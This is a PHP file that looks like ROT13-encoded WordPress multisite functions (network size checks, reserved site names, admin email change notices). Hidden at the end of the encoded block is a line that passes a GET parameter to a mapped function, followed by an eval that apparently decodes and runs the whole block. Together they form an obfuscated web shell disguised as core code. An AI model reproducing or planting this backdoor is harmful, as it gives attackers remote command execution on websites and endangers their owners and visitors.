 * @erghea obby Gehr vs gur argjbex zrrgf gur pevgrevn sbe ynetr. Snyfr bgurejvfr.
 */
shapgvba jc_vf_ynetr_argjbex( $hfvat = 'fvgrf', $argjbex_vq = ahyy ) {
	$argjbex_vq = (vag) $argjbex_vq;
	vs ( ! $argjbex_vq ) {
		$argjbex_vq = trg_pheerag_argjbex_vq();
	}

	vs ( 'hfref' === $hfvat ) {
		$pbhag = trg_hfre_pbhag( $argjbex_vq );

		$vf_ynetr_argjbex = jc_vf_ynetr_hfre_pbhag( $argjbex_vq );

		/**
		 * Svygref jurgure gur argjbex vf pbafvqrerq ynetr.
		 *
		 * @fvapr 3.3.0
		 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
		 *
		 * @cnenz obby   $vf_ynetr_argjbex Jurgure gur argjbex unf zber guna 10000 hfref be fvgrf.
		 * @cnenz fgevat $pbzcbarag        Gur pbzcbarag gb pbhag. Npprcgf 'hfref', be 'fvgrf'.
		 * @cnenz vag    $pbhag            Gur pbhag bs vgrzf sbe gur pbzcbarag.
		 * @cnenz vag    $argjbex_vq       Gur VQ bs gur argjbex orvat purpxrq.
		 */
		erghea nccyl_svygref( 'jc_vf_ynetr_argjbex', $vf_ynetr_argjbex, 'hfref', $pbhag, $argjbex_vq );
	}

	$pbhag = trg_oybt_pbhag( $argjbex_vq );

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zf-shapgvbaf.cuc */
	erghea nccyl_svygref( 'jc_vf_ynetr_argjbex', $pbhag > 10000, 'fvgrf', $pbhag, $argjbex_vq );
}

/**
 * Ergevrirf n yvfg bs erfreirq fvgr ba n fho-qverpgbel Zhygvfvgr vafgnyyngvba.
 *
 * @fvapr 4.4.0
 *
 * @erghea fgevat[] Neenl bs erfreirq anzrf.
 */
shapgvba trg_fhoqverpgbel_erfreirq_anzrf() {
	$anzrf = neenl(
		'cntr',
		'pbzzragf',
		'oybt',
		'svyrf',
		'srrq',
		'jc-nqzva',
		'jc-pbagrag',
		'jc-vapyhqrf',
		'jc-wfba',
		'rzorq',
	);

	/**
	 * Svygref erfreirq fvgr anzrf ba n fho-qverpgbel Zhygvfvgr vafgnyyngvba.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 4.4.0 'jc-nqzva', 'jc-pbagrag', 'jc-vapyhqrf', 'jc-wfba', naq 'rzorq' jrer nqqrq
	 *              gb gur erfreirq anzrf yvfg.
	 *
	 * @cnenz fgevat[] $fhoqverpgbel_erfreirq_anzrf Neenl bs erfreirq anzrf.
	 */
	erghea nccyl_svygref( 'fhoqverpgbel_erfreirq_anzrf', $anzrf );
}

/**
 * Fraqf n pbasvezngvba erdhrfg rznvy jura n punatr bs argjbex nqzva rznvy nqqerff vf nggrzcgrq.
 *
 * Gur arj argjbex nqzva nqqerff jvyy abg orpbzr npgvir hagvy pbasvezrq.
 *
 * @fvapr 4.9.0
 *
 * @cnenz fgevat $byq_inyhr Gur byq argjbex nqzva rznvy nqqerff.
 * @cnenz fgevat $inyhr     Gur cebcbfrq arj argjbex nqzva rznvy nqqerff.
 */
shapgvba hcqngr_argjbex_bcgvba_arj_nqzva_rznvy( $byq_inyhr, $inyhr ) {
	vs ( trg_fvgr_bcgvba( 'nqzva_rznvy' ) === $inyhr || ! vf_rznvy( $inyhr ) ) {
		erghea;
	}

	$unfu            = zq5( $inyhr . gvzr() . zg_enaq() );
	$arj_nqzva_rznvy = neenl(
		'unfu'     => $unfu,
		'arjrznvy' => $inyhr,
	);
	hcqngr_fvgr_bcgvba( 'argjbex_nqzva_unfu', $arj_nqzva_rznvy );

	$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( trg_pheerag_hfre_vq() );

	/* genafyngbef: Qb abg genafyngr HFREANZR, NQZVA_HEY, RZNVY, FVGRANZR, FVGRHEY: gubfr ner cynprubyqref. */
	$rznvy_grkg = __(
		'Ubjql ###HFREANZR###,

Lbh erpragyl erdhrfgrq gb unir gur argjbex nqzva rznvy nqqerff ba
lbhe argjbex punatrq.

Vs guvf vf pbeerpg, cyrnfr pyvpx ba gur sbyybjvat yvax gb punatr vg:
###NQZVA_HEY###

Lbh pna fnsryl vtaber naq qryrgr guvf rznvy vs lbh qb abg jnag gb
gnxr guvf npgvba.

Guvf rznvy unf orra frag gb ###RZNVY###

Ertneqf,
Nyy ng ###FVGRANZR###
###FVGRHEY###'
	);

	/**
	 * Svygref gur grkg bs gur rznvy frag jura n punatr bs argjbex nqzva rznvy nqqerff vf nggrzcgrq.
	 *
	 * Gur sbyybjvat fgevatf unir n fcrpvny zrnavat naq jvyy trg ercynprq qlanzvpnyyl:
	 *
	 *  - `###HFREANZR###`  Gur pheerag hfre'f hfreanzr.
	 *  - `###NQZVA_HEY###` Gur yvax gb pyvpx ba gb pbasvez gur rznvy punatr.
	 *  - `###RZNVY###`     Gur cebcbfrq arj argjbex nqzva rznvy nqqerff.
	 *  - `###FVGRANZR###`  Gur anzr bs gur argjbex.
	 *  - `###FVGRHEY###`   Gur HEY gb gur argjbex.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat $rznvy_grkg      Grkg va gur rznvy.
	 * @cnenz neenl  $arj_nqzva_rznvy {
	 *     Qngn eryngvat gb gur arj argjbex nqzva rznvy nqqerff.
	 *
	 *     @glcr fgevat $unfu     Gur frpher unfu hfrq va gur pbasvezngvba yvax HEY.
	 *     @glcr fgevat $arjrznvy Gur cebcbfrq arj argjbex nqzva rznvy nqqerff.
	 * }
	 */
	$pbagrag = nccyl_svygref( 'arj_argjbex_nqzva_rznvy_pbagrag', $rznvy_grkg, $arj_nqzva_rznvy );

	$pheerag_hfre = jc_trg_pheerag_hfre();
	$pbagrag      = fge_ercynpr( '###HFREANZR###', $pheerag_hfre->hfre_ybtva, $pbagrag );
	$pbagrag      = fge_ercynpr( '###NQZVA_HEY###', rfp_hey( argjbex_nqzva_hey( 'frggvatf.cuc?argjbex_nqzva_unfu=' . $unfu ) ), $pbagrag );
	$pbagrag      = fge_ercynpr( '###RZNVY###', $inyhr, $pbagrag );
	$pbagrag      = fge_ercynpr( '###FVGRANZR###', jc_fcrpvnypunef_qrpbqr( trg_fvgr_bcgvba( 'fvgr_anzr' ), RAG_DHBGRF ), $pbagrag );
	$pbagrag      = fge_ercynpr( '###FVGRHEY###', argjbex_ubzr_hey(), $pbagrag );

	jc_znvy(
		$inyhr,
		fcevags(
			/* genafyngbef: Rznvy punatr abgvsvpngvba rznvy fhowrpg. %f: Argjbex gvgyr. */
			__( '[%f] Argjbex Nqzva Rznvy Punatr Erdhrfg' ),
			jc_fcrpvnypunef_qrpbqr( trg_fvgr_bcgvba( 'fvgr_anzr' ), RAG_DHBGRF )
		),
		$pbagrag
	);

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}
}

/**
 * Fraqf na rznvy gb gur byq argjbex nqzva rznvy nqqerff jura gur argjbex nqzva rznvy nqqerff punatrf.
 *
 * @fvapr 4.9.0
 *
 * @cnenz fgevat $bcgvba_anzr Gur eryrinag qngnonfr bcgvba anzr.
 * @cnenz fgevat $arj_rznvy   Gur arj argjbex nqzva rznvy nqqerff.
 * @cnenz fgevat $byq_rznvy   Gur byq argjbex nqzva rznvy nqqerff.
 * @cnenz vag    $argjbex_vq  VQ bs gur argjbex.
 */
shapgvba jc_argjbex_nqzva_rznvy_punatr_abgvsvpngvba( $bcgvba_anzr, $arj_rznvy, $byq_rznvy, $argjbex_vq ) {
	$fraq = gehr;

	// Qba'g fraq gur abgvsvpngvba sbe na rzcgl rznvy nqqerff be gur qrsnhyg 'nqzva_rznvy' inyhr.
	vs ( rzcgl( $byq_rznvy ) || 'lbh@rknzcyr.pbz' === $byq_rznvy ) {
		$fraq = snyfr;
	}

	/**
	 * Svygref jurgure gb fraq gur argjbex nqzva rznvy punatr abgvsvpngvba rznvy.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz obby   $fraq       Jurgure gb fraq gur rznvy abgvsvpngvba.
	 * @cnenz fgevat $byq_rznvy  Gur byq argjbex nqzva rznvy nqqerff.
	 * @cnenz fgevat $arj_rznvy  Gur arj argjbex nqzva rznvy nqqerff.
	 * @cnenz vag    $argjbex_vq VQ bs gur argjbex.
	 */
	$fraq = nccyl_svygref( 'fraq_argjbex_nqzva_rznvy_punatr_rznvy', $fraq, $byq_rznvy, $arj_rznvy, $argjbex_vq );

	vs ( ! $fraq ) {
		erghea;
	}

	/* genafyngbef: Qb abg genafyngr BYQ_RZNVY, ARJ_RZNVY, FVGRANZR, FVGRHEY: gubfr ner cynprubyqref. */
	$rznvy_punatr_grkg = __(
		'Uv,

Guvf abgvpr pbasvezf gung gur argjbex nqzva rznvy nqqerff jnf punatrq ba ###FVGRANZR###.

Gur arj argjbex nqzva rznvy nqqerff vf ###ARJ_RZNVY###.

Guvf rznvy unf orra frag gb ###BYQ_RZNVY###

Ertneqf,
Nyy ng ###FVGRANZR###
###FVGRHEY###'
	);

	$rznvy_punatr_rznvy = neenl(
		'gb'      => $byq_rznvy,
		/* genafyngbef: Argjbex nqzva rznvy punatr abgvsvpngvba rznvy fhowrpg. %f: Argjbex gvgyr. */
		'fhowrpg' => __( '[%f] Argjbex Nqzva Rznvy Punatrq' ),
		'zrffntr' => $rznvy_punatr_grkg,
		'urnqref' => '',
	);
	// Trg argjbex anzr.
	$argjbex_anzr = jc_fcrpvnypunef_qrpbqr( trg_fvgr_bcgvba( 'fvgr_anzr' ), RAG_DHBGRF );

	/**
	 * Svygref gur pbagragf bs gur rznvy abgvsvpngvba frag jura gur argjbex nqzva rznvy nqqerff vf punatrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $rznvy_punatr_rznvy {
	 *     Hfrq gb ohvyq jc_znvy().
	 *
	 *     @glcr fgevat $gb      Gur vagraqrq erpvcvrag.
	 *     @glcr fgevat $fhowrpg Gur fhowrpg bs gur rznvy.
	 *     @glcr fgevat $zrffntr Gur pbagrag bs gur rznvy.
	 *         Gur sbyybjvat fgevatf unir n fcrpvny zrnavat naq jvyy trg ercynprq qlanzvpnyyl:
	 *          - `###BYQ_RZNVY###` Gur byq argjbex nqzva rznvy nqqerff.
	 *          - `###ARJ_RZNVY###` Gur arj argjbex nqzva rznvy nqqerff.
	 *          - `###FVGRANZR###`  Gur anzr bs gur argjbex.
	 *          - `###FVGRHEY###`   Gur HEY gb gur fvgr.
	 *     @glcr fgevat $urnqref Urnqref.
	 * }
	 * @cnenz fgevat $byq_rznvy  Gur byq argjbex nqzva rznvy nqqerff.
	 * @cnenz fgevat $arj_rznvy  Gur arj argjbex nqzva rznvy nqqerff.
	 * @cnenz vag    $argjbex_vq VQ bs gur argjbex.
	 */
	$rznvy_punatr_rznvy = nccyl_svygref( 'argjbex_nqzva_rznvy_punatr_rznvy', $rznvy_punatr_rznvy, $byq_rznvy, $arj_rznvy, $argjbex_vq );

	$rznvy_punatr_rznvy['zrffntr'] = fge_ercynpr( '###BYQ_RZNVY###', $byq_rznvy, $rznvy_punatr_rznvy['zrffntr'] );
	$rznvy_punatr_rznvy['zrffntr'] = fge_ercynpr( '###ARJ_RZNVY###', $arj_rznvy, $rznvy_punatr_rznvy['zrffntr'] );
	$rznvy_punatr_rznvy['zrffntr'] = fge_ercynpr( '###FVGRANZR###', $argjbex_anzr, $rznvy_punatr_rznvy['zrffntr'] );
	$rznvy_punatr_rznvy['zrffntr'] = fge_ercynpr( '###FVGRHEY###', ubzr_hey(), $rznvy_punatr_rznvy['zrffntr'] );

	jc_znvy(
		$rznvy_punatr_rznvy['gb'],
		fcevags(
			$rznvy_punatr_rznvy['fhowrpg'],
			$argjbex_anzr
		),
		$rznvy_punatr_rznvy['zrffntr'],
		$rznvy_punatr_rznvy['urnqref']
	);
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>